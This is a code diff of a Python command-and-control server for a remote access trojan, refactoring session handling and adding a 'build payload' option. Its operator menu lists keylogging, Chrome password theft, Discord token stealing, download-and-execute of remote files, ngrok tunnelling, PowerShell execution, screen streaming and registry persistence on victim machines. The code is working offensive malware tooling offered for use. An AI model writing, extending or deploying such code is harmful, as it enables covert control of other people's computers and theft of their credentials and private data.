@@ -161,82 +161,89 @@ def download_file(target, file_name):
 
 
 def target_communication(target, ip):
-    count = 0
-    while True:
-        command = input('youhacker-Shell~%s: ' % str(ip))
-        reliable_send(target, command)
-        if command == 'quit':
-            break
+    try:
+        count = 0
+        while True:
+            command = input('youhacker-Shell~%s: ' % str(ip))
+            reliable_send(target, command)
+            if command == 'quit':
+                break
 
-        elif command == 'back':
-            break
-        elif command == 'clear':
-            os.system('cls')
-        elif command[:6] == 'upload':
-            if isfile(command[7:]) == True:
-                upload_file(target, command[7:])
+            elif command == 'back':
+                break
+            elif command == 'clear':
+                os.system('cls')
+            elif command[:6] == 'upload':
+                if isfile(command[7:]) == True:
+                    upload_file(target, command[7:])
+                else:
+                    pass
+            elif command == 'ngroksetup':
+                upload_file(target, 'scripts\\ngrok.exe')
+            elif command[:8] == 'download':
+                download_file(target, command[9:])
+            elif command[:10] == 'screenshot':
+                f = open('screenshot%d' % (count) + '.png', 'wb')
+                target.settimeout(3)
+                chunk = target.recv(1024)
+                while chunk:
+                    f.write(chunk)
+                    try:
+                        chunk = target.recv(1024)
+                    except socket.timeout as e:
+                        break
+                target.settimeout(None)
+                f.close()
+                count += 1
+            elif command == 'help':
+                print(('''\n
+                    quit                                --> Quit Session With The Target
+                    isopen                              --> Scan a Client port Syntax=isopen ip:port
+                    clear                               --> Clear The Screen
+                    cd path                             --> Changes Directory On Target System
+                    upload filename                    --> Upload File To The target Machine
+                    download filename                   --> Download File From Target Machine
+                    keylog_start                        --> Start The Keylogger
+                    keylog_dump                         --> Read keylogged logs
+                    keylog_stop                         -->  Stop keylogger
+                    open_link                            --> Open a URL
+                    screenshot                          -->  make a screenshot
+                    dexec                               --> download and execute file from the internet
+                    start                               --> execute a programme
+                    run-pwr                            --> execute powershell command
+                    msgbox                             --> show msgbox ex:msgbox|yourtitle|yourtext
+                    chrome_recon                       --> recover Chrome Passwords
+                    disteal                            --> Get Discord tokens
+                    priv                               --> Check User Priv
+                    sysinfo                            --> get system information
+                    say                                --> make Target Computer talk ex: say something
+                    clip                               --> change data in clipoard
+                    pslist                             --> print the running process on the client
+                    kill                               --> kill running process with pid example:kill 1009
+                    screenshare                        --> stream client screen
+                    ssharescreen                       --> stopstreaming
+                    ngroksetup                         --> download ngrok on the client
+                    changepolicy                       --> execute powershell scripts
+                    cwallpaper                         --> change wallpaper
+                    persistence *RegName* *fileName*    --> Create Persistence In Registry'''))
+            elif command[:11] == 'screenshare':
+                upload_file(target, 'scripts\\screenshare.ps1')
+            elif command[:10] == 'cwallpaper':
+                upload_file(target, command[11:])
+
             else:
-               pass
-        elif command == 'ngroksetup':
-            upload_file(target,'scripts\\ngrok.exe')
-        elif command[:8] == 'download':
-            download_file(target, command[9:])
-        elif command[:10] == 'screenshot':
-            f = open('screenshot%d' % (count) + '.png', 'wb')
-            target.settimeout(3)
-            chunk = target.recv(1024)
-            while chunk:
-                f.write(chunk)
-                try:
-                    chunk = target.recv(1024)
-                except socket.timeout as e:
-                    break
-            target.settimeout(None)
-            f.close()
-            count += 1
-        elif command == 'help':
-            print(('''\n
-            quit                                --> Quit Session With The Target
-            isopen                              --> Scan a Client port Syntax=isopen ip:port
-            clear                               --> Clear The Screen
-            cd path                             --> Changes Directory On Target System
-            upload filename                    --> Upload File To The target Machine
-            download filename                   --> Download File From Target Machine
-            keylog_start                        --> Start The Keylogger
-            keylog_dump                         --> Read keylogged logs
-            keylog_stop                         -->  Stop keylogger
-            open_link                            --> Open a URL
-            screenshot                          -->  make a screenshot
-            dexec                               --> download and execute file from the internet
-            start                               --> execute a programme
-            run-pwr                            --> execute powershell command
-            msgbox                             --> show msgbox ex:msgbox|yourtitle|yourtext
-            chrome_recon                       --> recover Chrome Passwords
-            disteal                            --> Get Discord tokens
-            priv                               --> Check User Priv
-            sysinfo                            --> get system information
-            say                                --> make Target Computer talk ex: say something
-            clip                               --> change data in clipoard
-            pslist                             --> print the running process on the client
-            kill                               --> kill running process with pid example:kill 1009
-            screenshare                        --> stream client screen
-            ssharescreen                       --> stopstreaming
-            ngroksetup                         --> download ngrok on the client
-            changepolicy                       --> execute powershell scripts
-            cwallpaper                         --> change wallpaper
-            persistence *RegName* *fileName*    --> Create Persistence In Registry'''))
-        elif command[:11] == 'screenshare':
-            upload_file(target,'scripts\\screenshare.ps1')
-        elif command[:10] == 'cwallpaper':
-                upload_file(target,command[11:])
-
-        else:
-            result = reliable_recv(target)
-            print(result)
+                result = reliable_recv(target)
+                print(result)
+    except:
+        targets.remove(target)
+        ips.remove(ip)
+        users.remove(user)
+        print("[-] session lost")
 
 
 def accept_connections():
     global clients
+    global  user
     while True:
         if stop_flag:
             break
@@ -244,8 +251,10 @@ def accept_connections():
         try:
             target, ip = sock.accept()
             key = open('key.txt', 'r').read()
-
-            if  target.recv(1024).decode() == key:
+            cred = target.recv(1024).decode().split(':')
+            user = cred[1]
+            if  cred[0]== key and user not in users:
+                users.append(user)
                 targets.append(target)
                 ips.append(ip)
                 print((str(ip) + ' has connected!'))
@@ -259,8 +268,10 @@ def accept_connections():
 
 
 clients = 0
+users = []
 targets = []
 ips = []
+
 stop_flag = False
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 p = open('serverport.txt', 'r').read()
@@ -288,10 +299,13 @@ while True:
             tarip = ips[num]
             target_communication(tarnum, tarip)
         except:
-            print('[-] No Session for that number')
+
+
+            print('[-] No Session for that number or session lost')
     elif command == 'help':
         print("""
     banner          --> print the banner
+    build           --> build payload
     connect         --> connect to target
     sendall         --> send command to all targets
     hacked          --> see connected targets
